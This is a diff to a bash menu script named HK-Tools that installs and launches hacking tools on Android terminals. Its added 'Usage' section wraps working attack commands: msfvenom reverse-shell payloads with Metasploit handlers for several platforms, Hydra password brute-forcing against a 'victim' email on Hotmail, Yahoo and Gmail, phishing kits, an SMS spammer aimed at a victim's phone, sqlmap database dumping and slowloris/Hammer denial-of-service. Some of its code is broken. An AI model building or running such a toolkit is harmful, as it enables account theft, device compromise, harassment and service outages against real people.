@@ -22,9 +22,11 @@ echo -e $green   "1- Tools-Gnuroot"
 echo ""
 echo -e $green   "2- Tools-Termux"
 echo ""
-echo -e $green   "3- About me"
+echo -e $green   "3- Usage"
 echo ""
-echo -e $green   "0- EXIT"
+echo -e $green   "4- About me"
+echo ""
+echo -e $green   "0- EXIT |-|"
 echo "" 
 echo "" 
 echo -e $green "Enter The Number:" 
@@ -46,8 +48,8 @@ echo -e $yellow "By =====> $red HACKER / MOHAMMED "
 echo '' 
 echo -e $red "Gnuroot"
 echo ""
-echo -e $green "1- DDOS Attack" 
-echo "" 
+echo -e $green "1- DDOS Attack"
+echo ""
 echo -e $green "2- Sniffing" 
 echo "" 
 echo -e $green "3- Wifi Hack"
@@ -181,8 +183,7 @@ apt-get install curl
 adduser m-info
 123456
 su m-info
-curl 
-https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb 
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb 
 >msfinstall && \
 chmod 755 msfinstall && \ 
 ./msfinstall
@@ -319,6 +320,8 @@ echo -e $green "11- dirsearch"
 echo ""
 echo -e $green "12- Google-Dork-Scan"
 echo ""
+echo -e $green "13- zenmap"
+echo ""
 echo -e $green "00- Back"
 read website
 if [ $website = 1 ]
@@ -420,6 +423,15 @@ echo -e $red
 figlet "Google-Dork-Scan"
 cd ~
 git clone https://github.com/ReiGelado/Google-Dork-Scan
+bash Hk-Tools.sh
+fi
+if [ $website = 13 ]
+then
+clear
+echo -e $red
+figlet "zenmap"
+cd ~
+apt-get install zenmap
 bash Hk-Tools.sh
 fi
 if [ $website = 00 ]
@@ -600,6 +612,12 @@ echo -e $green "2- Ngrok"
 echo ""
 echo -e $green "3- change style"
 echo ""
+echo -e $green "4- style lxde"
+echo ""
+echo -e $green "5- wireshark"
+echo ""
+echo -e $green "6- nano"
+echo ""
 echo -e $green "00- Back "
 echo ""
 read other
@@ -629,7 +647,36 @@ figlet "change stayle"
 cd ~
 git clone https://github.com/profionaldhim/etc/blob/master/bash.bashrc
 cp bash.bashrc etc
+cd etc
+rm -rif motd
 bash Hk-Tools.sh
+fi
+if [ $other = 4 ]
+then
+clear
+echo -e $red
+figlet "lxde"
+cd ~
+apt-get install xterm
+apt-get install lxde 
+bash Hk-Tools.sh
+fi
+if [ $other = 5 ]
+then
+clear
+echo -e $red
+figlet "wireshark"
+cd ~
+apt-get install wireshark
+bash Hk-Tools.sh
+fi
+if [ $other = 6 ]
+then
+clear
+echo -e $red
+figlet "nano"
+cd ~
+apt-get install nano -y
 fi
 if [ $other = 00 ]
 then
@@ -1127,7 +1174,7 @@ clear
 echo -e $red
 figlet "Sqlmap"
 cd ~
-git clonehttps://github.com/sqlmapproject/sqlmap
+git clone https://github.com/sqlmapproject/sqlmap
 bash Hk-Tools.sh
 fi
 if [ $ter_website = 2 ]
@@ -1471,6 +1518,8 @@ echo -e $green "2- Ngrok"
 echo ""
 echo -e $green "3- change style"
 echo ""
+echo -e $green "4- root - sudo"
+echo ""
 echo -e $green "00- Back "
 echo ""
 read other2
@@ -1505,6 +1554,24 @@ cd usr/etc
 rm -rif motd
 bash Hk-Tools.sh
 fi
+if [ $other2 = 4 ]
+then
+clear
+echo -e $red
+figlet "root - sudo"
+cd ~
+apt upgrade
+pkg install git -y
+pkg install ncurses-utils -y
+git clone https://github.com/st42/termux-sudo
+ls
+cd termux-sudo
+ls
+cat sudo > /data/data/com.termux/files/usr/bin/sudo
+chmod 700 /data/data/com.termux/files/usr/bin/sudo
+sudo
+bash Hk-Tools.sh
+fi
 if [ $other2 = 00 ]
 then
 clear
@@ -1513,6 +1580,815 @@ fi
 fi
 fi
 if [ $name = 3 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) ----------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "TOOLS"
+echo ""
+echo -e $green "1- injection payloads"
+echo ""
+echo -e $green "2- Scan Ip"
+echo ""
+echo -e $green "3- account hack"
+echo ""
+echo -e $green "4- send sms"
+echo ""
+echo -e $green "5- web hack"
+echo ""
+echo -e $green "6- dos attack"
+echo ""
+echo -e $green "7- scan port"
+echo ""
+echo -e $green "00- Back "
+echo ""
+read usage
+if [ $usage = 1 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) ----------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "Injection payloads"
+echo ""
+echo -e $green "1- msfvenom"
+echo ""
+echo -e $green "2- Tmux-Bunch"
+echo ""
+echo -e $green "3- PAYMAX"
+echo ""
+echo -e $green "00- Back "
+echo ""
+read injection_payload
+if [ $injection_payload = 1 ]
+then
+clear
+echo ""
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) --------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "msfvenom"
+echo ""
+echo -e $green     "1- Payload Android"
+echo -e $green     "2- Payload Windows"
+echo -e $green     "3- Payload Linux"
+echo -e $green     "4- Payload Mac"
+echo -e $green     "5- Payload ISO"
+echo -e $green     "6- Payload Python"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+echo ""
+echo -e $green     "Enter The Number"
+echo -e $red
+read pa
+if [ $pa = 1 ]
+then
+clear
+figlet "Payload Android"
+echo ""
+echo -e $green "What is LHOST"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT"
+echo -e $red
+read lport
+echo ""
+echo -e $green "Name Payload?"
+echo -e $red
+read name
+echo ""
+toilet "Loading" | lolcat
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $HOME/$name.apk
+echo ""
+echo -e $green "do you want start  metasploit? y/n"
+echo -e $red
+read yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo -e $green "What is LHOST?"
+echo -e $red
+read host
+echo ""
+echo -e $green "What is LPORT?"
+echo -e $red
+read port
+echo ""
+toilet "START" | lolcat
+msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $pa = 2 ]
+then
+clear
+figlet "Make Payload Windows"
+echo ""
+echo -e $green "What is LHOST"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT"
+echo -e $red
+read lport
+echo ""
+echo -e $green "Name Payload?"
+echo -e $red
+read name
+echo ""
+toilet "loading" | lolcat
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o/$HOME/$name.exe
+echo ""
+echo -e $green "do you want start metasploit? y/n"
+echo -e $red
+read yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo -e $green "What is LHOST?"
+echo -e $red
+read host
+echo ""
+echo -e $green "What is LPORT?"
+echo -e $red
+read port
+echo ""
+toilet "START" | lolcat
+msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $pa = 3 ]
+then
+clear
+figlet "Payload linux"
+echo ""
+echo -e $green "What is LHOST"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT"
+echo -e $red
+read lport
+echo ""
+echo -e $green "Name Payload?"
+echo -e $red
+read name
+echo ""
+toilet "Loading" | lolcat
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o/$HOME/$name.elf
+echo ""
+echo -e $green "do you want start metasploit? y/n"
+echo -e $red
+read yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo -e $green "What is LHOST?"
+echo -e $red
+read host
+echo ""
+echo -e $green "What is LPORT?"
+echo -e $red
+read port
+echo ""
+toilet "START" | lolcat
+msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+clear
+echo -e $green"Save Payload To" $HOME/$namp.elf
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $pa = 4 ]
+then
+clear
+figlet "Payload mac"
+echo ""
+echo -e $green "What is LHOST"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT"
+echo -e $red
+read lport
+echo ""
+echo -e $green "Name Payload?"
+echo -e $red
+read name
+echo ""
+toilet "Loading" | lolcat
+msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho  LHOST=$lhost LPORT=$lport -o/$HOME/$name.macho
+echo ""
+echo -e $green "do you want start metasploit? y/n"
+echo -e $red
+read yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo -e $green "What is LHOST?"
+echo -e $red
+read host
+echo ""
+echo -e $green "What is LPORT?"
+echo -e $red
+read port
+echo ""
+toilet "START" | lolcat
+msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $pa = 5 ]
+then
+clear
+figlet "Payload iso"
+echo ""
+echo -e $green "What is LHOST"
+echo -e $red
+echo ""
+read lhost
+echo -e $green "What is LPORT"
+echo ""
+read lport
+echo -e $red
+echo -e $green "Name Payload?"
+echo ""
+read name
+echo -e $red
+toilet "Loading" | lolcat
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o/$HOME/$name.api
+echo ""
+echo -e $green "do you want start metasploit? y/n"
+echo -e $red
+read yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo -e $green "What is LHOST?"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT?"
+echo -e $red
+read lport
+echo ""
+toilet "START" | lolcat
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o/$HOME/$name.api
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $pa = 6 ]
+then
+clear
+figlet "Payload python"
+echo ""
+echo -e $green "What is LHOST"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT"
+echo -e $red
+read lport
+echo ""
+echo -e $green "Name Payload?"
+echo -e $red
+read name
+echo ""
+toilet "Loading" | lolcat
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $HOME/$name.py
+echo ""
+echo -e $green "do you want start  metasploit? y/n"
+echo -e $red
+read yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo -e $green "What is LHOST?"
+echo -e $red
+read lhost
+echo ""
+echo -e $green "What is LPORT?"
+echo -e $red
+read lport
+echo ""
+toilet "START" | lolcat
+msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $pa = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $injection_payload = 2 ]
+then
+clear
+echo -e $red
+figlet "Tmux-Bunch"
+cd ~
+cd Tmux-Bunch
+./tmuxbunch
+bash Hk-Tools.sh
+fi
+if [ $injection_payload = 3 ]
+then
+clear
+echo -e $red
+figlet "PAYMAX"
+cd ~
+cd PAYMAX
+python2 paymax.py
+bash Hk-Tools.sh
+fi
+if [ $injection_payload = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $usage = 2 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) -------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "Scan Ip"
+echo ""
+echo -e $green     "1- nmap"
+echo -e $green     "2- Devploit"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+echo ""
+read scanport
+if [ $scanport = 1 ]
+then
+clear
+figlet "scan nmap"
+echo ""
+echo -e $green "What is Ip web/device "
+echo -e $red
+read ip
+echo ""
+toilet "Loading" | lolcat
+nmap $ip
+fi
+if [ $scanport = 2 ]
+then
+clear
+figlet "scan Devploit"
+echo ""
+echo ""
+toilet "Loading" | lolcat
+cd ~
+cd Devploit
+python2 Devploit
+fi
+if [ $scanport = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $usage = 3 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) ---------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "Account Hack"
+echo ""
+echo -e $green     "1- Crunch wordlist"
+echo -e $green     "2- Hydra"
+echo -e $green     "3- weeman"
+echo -e $green     "4- socialfish"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+echo ""
+read accountHk
+if [ $accountHk = 1 ]
+then
+clear
+figlet "Creat wordlist"
+echo ""
+echo -e $green "what is the username ? "
+echo -e $red
+read user
+echo ""
+echo -e $green "the phone or any number .. "
+echo -e $red
+read phfone
+echo ""
+echo -e $green "name list ex :pass.txt "
+echo -e $red
+read namelist
+echo ""
+echo -e $green "little user name + phone = ? example : mohammed773532224 = little = 8 phone =9 then 8+9=17 "
+echo -e $red
+read much
+echo ""
+echo -e $green "please insert path save ex:/sdcard/"
+echo -e $red
+read pathsave
+echo ""
+echo -e $green "insert your pass hack ex:user@@@@@"
+echo -e $red
+read num
+echo ""
+toilet "Loading" | lolcat
+crunch $much $much $phone -t $num -o $pathsave$namelist
+bash Hk-Tools.sh
+fi
+if [ $accountHk = 2 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) -------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "Hydra"
+echo ""
+echo -e $green     "1- Hotmail"
+echo -e $green     "2- Yahoo"
+echo -e $green     "3- Gmail"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+read hydra
+if [ $hydra = 1 ]
+then
+clear
+figlet "Hotmail Hack"
+echo -e $yellow "please insert vactime email .."
+echo -e $red
+read hayd
+echo -e $yellow "please insert path wordlist .."
+echo -e $red
+read pass
+hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.live.com smtp
+fi
+if [ $hydra = 2 ]
+then
+clear
+figlet "Yahoo Hack"
+echo -e $yellow "please insert vactime email .."
+echo -e $red
+read hayd
+echo -e $yellow "please insert path wordlist ..."
+echo -e $red
+read pass
+hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.mail.yahoo smtp
+bash Hk-Tools.sh
+fi
+if [ $hydra = 3 ]
+then
+clear
+figlet "Gmail Hack"
+echo -e $yellow "please insert vactime email .."
+echo -e $red
+read hayd
+echo -e $yellow "please insert path wordlist..."
+echo -e $red
+read pass
+hydra -S -l $hayd -P $pass -v -V -e ns -s 465 smtp.gmail.com smtp
+bash Hk-Tools.sh
+fi
+if [ $hydra = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $accountHk = 3 ]
+then
+clear
+figlet "weeman"
+cd ~
+cd Tools-Hk/weeman
+python2 weeman.py
+bash Hk-Tools.sh
+fi
+if [ $accountHk = 4 ]
+then
+clear
+figlet "SocialFish"
+cd ~
+cd Tools-Hk/SocialFish
+chmod +x SocialFish.py
+pip install -r requirements.txt
+pip2 install wget
+python2 SocialFish.py
+bash Hk-Tools.sh
+fi
+if [ $accountHk = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $usage = 4 ]
+then
+clear
+echo -e $yellow "please insert how many second .."
+read delay
+echo -e $yellow "please insert vactime phone .."
+read phone
+cd ~
+cd Spammer-Grab
+chmod +x spammer.py
+echo "Installing..."
+apt update &> /dev/null
+apt install python2 -y &> /dev/null
+apt install python2-pip -y &> /dev/null
+pip2 install requests &> /dev/null
+echo "Done"
+python2 spammer.py --delay $delay $phone
+bash Hk-Tools.sh
+fi
+if [ $usage = 5 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) -------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red   "web hack"
+echo ""
+echo -e $green     "1- Sqlmap"
+echo ""
+echo -e $green     "2- Scriptux(creat index)"
+echo ""
+echo -e $green     "3- sniper-h(list hash)"
+echo ""
+echo -e $green     "4- Hash Mix"
+echo ""
+echo -e $green     "5- hash-identifier"
+echo ""
+echo -e $green     "6- dirsearch"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+read whk
+if [ $whk = 1 ]
+then
+clear
+echo -e $yellow "please insert web url"
+read wehk
+cd ~
+cd sqlmap
+python sqlmap.py -u $read --dbs
+echo -e $yellow "please insert database"
+read datat
+python sqlmap.py -u $read --dbs
+echo -e $yellow "please insert table"
+read table
+python sqlmap.py -u $read -D $data --tables
+echo -e $yellow "please insert columns"
+read columns
+python sqlmap.py -u $read -D $data -T $tables columns
+echo -e $yellow "please insert data columns"
+read dump
+python sqlmap.py -u $read -D $data -T $tables -C $columns --dump
+
+echo -e $yellow "Do you want define type hash insert y/n "
+read typehash
+if [ $typehash = "y" ]
+then
+clear
+cd ~
+cd hash-identifier.py
+python2 hash-identifier.py
+
+else
+bash Hk-Tools.sh
+fi
+fi
+if [ $whk = 2 ]
+then
+clear
+figlet "Creat index "
+cd ~
+cd Tools-Hk/Scriptux
+sudo su
+python2 scriptux.py
+bash Hk-Tools.sh
+fi
+if [ $whk = 3 ]
+then
+clear
+figlet "sniper-h "
+cd ~
+cd sniper-h
+echo -e $yellow "Do you have list Hash ? please insert y/n"
+read pathlist
+if [ $pathlist = "y" ]
+then
+clear
+figlet "sniper-h"
+echo -e $yellow "please insert path list ex : /sdcard/wordlist.txt"
+read pa
+python3 sniper-h.py -H $Hash -W $pa -T md5
+bash Hk-Tools.sh
+else
+cd ~
+cd sniper-h
+python3 sniper-h.py -H $Hash -W wordlist.txt -T md5
+bash Hk-Tools.sh
+fi
+fi
+if [ $whk = 4 ]
+then
+clear
+figlet "Hash Mix "
+git clone https://github.com/Matrix07ksa/HashMix
+cd ~
+cd Tools-Hk/HashMix
+chmod +x hashmix.py
+python2 hashmix.py
+fi
+if [ $whk = 5 ]
+then
+clear
+figlet "hash-identifier"
+cd ~
+cd hash-identifier.py
+python2 hash-identifier.py
+fi
+if [ $whk = 6 ]
+then
+clear
+figlet "dirsearch "
+cd ~
+cd dirsearch
+echo -e $yellow "please insert url"
+read url
+python3 dirsearch.py -u $url -e *
+bash Hk-Tools.sh
+fi
+if [ $whk = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+if [ $usage = 6 ]
+then
+clear
+toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e $green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 1) ------------"
+echo -e $yellow "By =====> $red HACKER / MOHAMMED "
+echo ''
+echo -e $red      " DDos Attack"
+echo ""
+echo -e $green     "1- slowloris"
+echo -e $green     "2- Hammer"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+read Ddosattack
+if [ $Ddosattack = 1 ]
+then
+clear
+figlet "Slowloris "
+cd ~
+git clone https://github.com/gkbrk/slowloris.git
+cd slowloris
+python setup.py
+figlet "Dos Attack"
+echo -e $yellow "please insert url web"
+read url
+python slowloris.py $url
+fi
+if [ $Ddosattack = 2 ]
+then
+clear
+figlet "Hammer "
+cd ~
+cd hammer
+echo -e $yellow "please insert ip web.."
+read ip
+echo -e $yellow "please insert port defult :80"
+read port
+echo -e $yellow "please insert speed defult :135"
+read speed
+python3 hammer.py -s $ip -p $port -t $speed
+bash Hk-Tools.sh
+fi
+if [ $Ddosattack = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $usage = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+if [ $usage = 7 ]
+then
+clear
+toilet -f term -F border --gay "fb : 
+www.fb.com/profionaldhim"
+echo -e $red
+figlet -f slant "HK-Tools"
+echo -e 
+$green"-----------------------------------"
+toilet "YEMEN" | lolcat
+echo -e $green"--------------$yellow(2 in 
+1) ---------------"
+echo -e $yellow "By =====> $red HACKER / 
+MOHAMMED "
+echo ''
+echo -e $red   "Scan port"
+echo ""
+echo -e $green     "1- nmap"
+echo -e $green     "2- Devploit"
+echo ""
+echo -e $green     "00- BACK"
+echo ""
+echo ""
+read scanport1
+if [ $scanport1 = 1 ]
+then
+clear
+figlet "scan nmap"
+echo ""
+echo -e $green "What is Ip  web/device "
+echo -e $red
+read ip
+echo ""
+toilet "Loading" | lolcat
+nmap -sV $ip
+fi
+if [ $scanport1 = 2 ]
+then
+clear
+figlet "scan Devploit"
+echo ""
+echo ""
+toilet "Loading" | lolcat
+cd ~
+cd Devploit
+python2 Devploit
+fi
+if [ $scanport1 = 00 ]
+then
+clear
+bash Hk-Tools.sh
+fi
+fi
+fi
+if [ $name = 4 ]
 then
 clear
 toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
